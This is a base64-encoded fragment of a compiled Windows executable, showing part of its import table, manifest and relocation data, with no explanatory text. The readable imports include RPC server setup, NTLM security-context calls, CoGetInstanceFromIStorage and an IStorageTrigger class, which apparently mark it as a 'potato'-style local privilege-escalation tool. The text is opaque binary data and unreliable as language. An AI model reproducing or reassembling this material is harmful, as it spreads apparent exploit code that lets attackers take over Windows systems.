AAAAAAD+////AAAAANj///8AAAAA/v///9BRQQDsUUEAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAADtTQQAAAAAA/v///wAAAADI////AAAAAP7///8AAAAAelVBAAAAAAD+////AAAAANj///8AAAAA/v////l6QQAMe0EAAwAAAEwlQgAEJUIAICVCABAAAAAkOUIAAAAAAP////8AAAAADAAAAJAlQAAAAAAAQDlCAAAAAAD/////AAAAAAwAAACAJEAAAAAAAPAkQAAAAAAA9CRCAAAAAABcOUIAAAAAAP////8AAAAADAAAAFAlQAAAJgIAAAAAAAAAAABCKAIADJABAJAnAgAAAAAAAAAAAAIpAgCckQEAUCcCAAAAAAAAAAAAKikCAFyRAQD0JQIAAAAAAAAAAABmKQIAAJABACQnAgAAAAAAAAAAABAqAgAwkQEARCcCAAAAAAAAAAAAUCoCAFCRAQAAAAAAAAAAAAAAAAAAAAAAAAAAADYpAgBOKQIAAAAAANgnAgDkJwIA9icCAAwoAgAcKAIALigCANQuAgDGLgIAuC4CAKouAgCeLgIAii4CAHouAgDIJwIAUi4CAD4uAgAsLgIAHC4CAAIuAgDoLQIAzi0CALgtAgCsLQIAoC0CAJYtAgCELQIAdC0CAGAtAgBULQIAwCcCAGguAgC0JwIAPi0CADAtAgAgLQIADi0CAFwqAgB4KgIAlioCAKoqAgC+KgIA2ioCAPQqAgAKKwIAICsCADorAgBQKwIAZCsCAHYrAgCCKwIAlCsCAKArAgCyKwIAwisCANIrAgDqKwIAAiwCABosAgBCLAIATiwCAFwsAgBqLAIAdCwCAIIsAgCULAIAoiwCALgsAgDILAIA1CwCAOosAgD8LAIA5C4CAAAAAAC6KQIAcikCAP4pAgDmKQIAkCkCAMwpAgCoKQIAAAAAABwqAgA0KgIAAAAAAAIAAIANAACAHCkCAAwpAgB0AACAAwAAgAEAAIALAACAEwAAgBcAAIAEAACAEAAAgAkAAIBvAACAcwAAgAAAAACqKAIAligCAOYoAgB0KAIAYigCAFAoAgCEKAIAyigCAAAAAABMA0hlYXBGcmVlAACBBVNsZWVwAGQCR2V0TGFzdEVycm9yAABIA0hlYXBBbGxvYwC3AkdldFByb2Nlc3NIZWFwAADbBVdhaXRGb3JTaW5nbGVPYmplY3QA9gBDcmVhdGVUaHJlYWQAALECR2V0UHJvY0FkZHJlc3MAAHsCR2V0TW9kdWxlSGFuZGxlVwAAS0VSTkVMMzIuZGxsAACIAENvVGFza01lbUFsbG9jAAAMAENMU0lERnJvbVN0cmluZwBdAENvSW5pdGlhbGl6ZQAAjQBDb1VuaW5pdGlhbGl6ZQAAKABDb0NyZWF0ZUluc3RhbmNlAAC4AVN0Z0NyZWF0ZURvY2ZpbGVPbklMb2NrQnl0ZXMAAKIAQ3JlYXRlSUxvY2tCeXRlc09uSEdsb2JhbABJAENvR2V0SW5zdGFuY2VGcm9tSVN0b3JhZ2UAb2xlMzIuZGxsAJUAZnJlZWFkZHJpbmZvAACWAGdldGFkZHJpbmZvAFdTMl8zMi5kbGwAAOMAQ3J5cHRTdHJpbmdUb0JpbmFyeUEAAH4AQ3J5cHRCaW5hcnlUb1N0cmluZ0EAAENSWVBUMzIuZGxsANcBUnBjU2VydmVyUmVnaXN0ZXJBdXRoSW5mb0EAANoBUnBjU2VydmVyUmVnaXN0ZXJJZjIAAI0BUnBjRXBSZWdpc3RlckEAANYBUnBjU2VydmVyTGlzdGVuAOcBUnBjU2VydmVyVXNlUHJvdHNlcUVwQQAAyQFScGNTZXJ2ZXJJbnFCaW5kaW5ncwAALQFOZHJTZXJ2ZXJDYWxsMgAAUlBDUlQ0LmRsbAAAAABBY2NlcHRTZWN1cml0eUNvbnRleHQAAgBBY3F1aXJlQ3JlZGVudGlhbHNIYW5kbGVXAFNlY3VyMzIuZGxsALEFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABxBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAaAkdldEN1cnJlbnRQcm9jZXNzAJAFVGVybWluYXRlUHJvY2VzcwAAiQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AE8EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAGwJHZXRDdXJyZW50UHJvY2Vzc0lkAB8CR2V0Q3VycmVudFRocmVhZElkAADsAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGYDSW5pdGlhbGl6ZVNMaXN0SGVhZACCA0lzRGVidWdnZXJQcmVzZW50ANMCR2V0U3RhcnR1cEluZm9XANMDTG9jYWxGcmVlAKkBRm9ybWF0TWVzc2FnZUEAANUEUnRsVW53aW5kAGQEUmFpc2VFeGNlcHRpb24AADQFU2V0TGFzdEVycm9yAAAwAUVuY29kZVBvaW50ZXIANAFFbnRlckNyaXRpY2FsU2VjdGlvbgAAwQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAEwFEZWxldGVDcml0aWNhbFNlY3Rpb24AYgNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AKIFVGxzQWxsb2MAAKQFVGxzR2V0VmFsdWUApQVUbHNTZXRWYWx1ZQCjBVRsc0ZyZWUArgFGcmVlTGlicmFyeQDHA0xvYWRMaWJyYXJ5RXhXAABhAUV4aXRQcm9jZXNzAHoCR2V0TW9kdWxlSGFuZGxlRXhXAADVAkdldFN0ZEhhbmRsZQAAFgZXcml0ZUZpbGUAdwJHZXRNb2R1bGVGaWxlTmFtZVcAANkBR2V0Q29tbWFuZExpbmVBANoBR2V0Q29tbWFuZExpbmVXAJ4AQ29tcGFyZVN0cmluZ1cAALUDTENNYXBTdHJpbmdXAABRAkdldEZpbGVUeXBlAAIGV2lkZUNoYXJUb011bHRpQnl0ZQB4AUZpbmRDbG9zZQB+AUZpbmRGaXJzdEZpbGVFeFcAAI8BRmluZE5leHRGaWxlVwCPA0lzVmFsaWRDb2RlUGFnZQC1AUdldEFDUAAAmgJHZXRPRU1DUAAAxAFHZXRDUEluZm8A8wNNdWx0aUJ5dGVUb1dpZGVDaGFyADoCR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAArQFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwAWBVNldEVudmlyb25tZW50VmFyaWFibGVXAE4FU2V0U3RkSGFuZGxlAADaAkdldFN0cmluZ1R5cGVXAACiAUZsdXNoRmlsZUJ1ZmZlcnMAAAMCR2V0Q29uc29sZU91dHB1dENQAAD/AUdldENvbnNvbGVNb2RlAABPAkdldEZpbGVTaXplRXgAJQVTZXRGaWxlUG9pbnRlckV4AABRA0hlYXBTaXplAABPA0hlYXBSZUFsbG9jAIkAQ2xvc2VIYW5kbGUAzgBDcmVhdGVGaWxlVwAVBldyaXRlQ29uc29sZVcADAFEZWNvZGVQb2ludGVyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACxGb9ETuZAu/////8BAAAAAQAAAAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAgBZMZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAMAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAACAAAoKCgAAAAAAAAAAAAAA/////wAAAADgv0EAAQAAAAAAAAABAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4MUIAAAAAAAAAAAAAAAAA+DFCAAAAAAAAAAAAAAAAAPgxQgAAAAAAAAAAAAAAAAD4MUIAAAAAAAAAAAAAAAAA+DFCAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDdCAAAAAAAAAAAAYMJBAODDQQAgukEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODFCAAAyQgBDAAAA4sRBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQAAAAAAAAICAgICAgICAg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MlAyWDJgMmgycDJ4MqA4pDioOAAAALABADABAACYMqAyqDKsMrAytDK4MrwywDLEMswy0DLUMtgy3DLgMuQy6DL0MvwyBDMIMwwzEDMUM4A0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0zDSYOZw5oDmkOag5rDmwObQ5uDm8OcA5xDnIOcw50DnUOSA6JDooOiw6MDo0Ojg6PDpAOkQ6SDpMOlA6VDpYOlw6YDpkOmg6bDpwOnQ6eDp8OoA6hDqIOow6kDqUOpg6nDqgOqQ6qDqsOrA6tDq4Orw6wDrEOsg61DrYOtw64DrkOug67DrwOvQ6+Dr8OgA7BDsIOww7EDsUOxg7HDsgOyQ7KDssOzA7NDs4Ozw7QDtEO0g7TDtQO1Q7WDtcO2A7ZDtoO2w7cDt0O3g7fDuAOwDAAQDYAQAA5DboNuw28DY0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDocOiQ6LDo0Ojw6RDpMOlQ6XDpkOmw6dDp8OoQ6jDqUOpw6pDqsOrQ6vDrEOsw61DrcOuQ67Dr0Ovw6BDsMOxQ7HDskOyw7NDs8O0Q7TDtUO1w7ZDtsO3Q7fDuEO4w7lDucO6Q7rDu0O7w7xDvMO9Q73DvkO+w79Dv8OwQ8DDwUPBw8JDwsPDQ8PDxEPEw8VDxcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9FD0cPSQ9LD00PTw9RD1MPVQ9XD1kPWw9dD18PYQ9jD2UPZw9pD2sPbQ9vD3EPcw91D3cPeQ97D30Pfw9BD4MPhQ+HD4kPiw+ND48PkQ+TD4A0AEA0AEAAFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIORA5GDkgOSg5MDk4OUA5SDlQOVg5YDloOXA5eDmAOYg5kDmYOaA5qDmwObg5wDnIOdA52DngOeg58Dn4OQA6CDoQOhg6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD2gPag9sD24PcA9yD3QPdg94D3oPfA9+D0APgg+ED4YPiA+KD4wPjg+QD5IPlA+WD5gPmg+cD54PoA+iD6QPpg+oD6oPrA+uD7APsg+0D7YPuA+6D7wPvg+AD8IPxA/GD8gPyg/MD84P0A/SD9QP1g/YD9oPwDwAQBMAAAAWjNeM2IzZjNcPGQ8bDx0PHw8hDyMPJQ8nDykPKw8tDy8PMQ8zDzUPNw85DzsPPQ8/DwEPQw9FD0cPSQ9LD00PTw9AAAAAAIAVAAAAKQzqDOsM7AztDO4M7wzwDPEM8gzzDPQM9Qz2DPcM+Az5DPoM+wz8DP0M/gz/DMANAQ0CDQMNBA0FDS8P8A/xD/IP8w/0D/UP+w/9D8AEAIAPAEAAAAwBDAIMCAw4DDkMOgw7DDwMPQw+DD8MAAxBDF4MnwygDKEMogyjDLEMtQy3DLgMuQy6DLsMvAy9DL8NgA3CDd4N4w3kDegN6Q3rDfEN9Q32DfoN+w38Df4NxA4IDgkODQ4ODg8OEA4SDhgOHA4dDiEOIg4jDiUOKw4vDjAONg43DjgOPQ4+DgQORQ5GDkcOSA5JDk4OTw5QDlYOWg5bDl8OYA5lDmYObA5tDnMOdA56DnsOfA5+DkQOiA6JDooOiw6MDpEOkg6WDpcOmA6ZDpsOoQ6iDqgOqQ6vDrAOsQ6zDrgOuQ6+Dr8OgA7FDskOyg7ODtIO1g7aDtsO3A7iDuMO6Q7qDvAO9g++D40P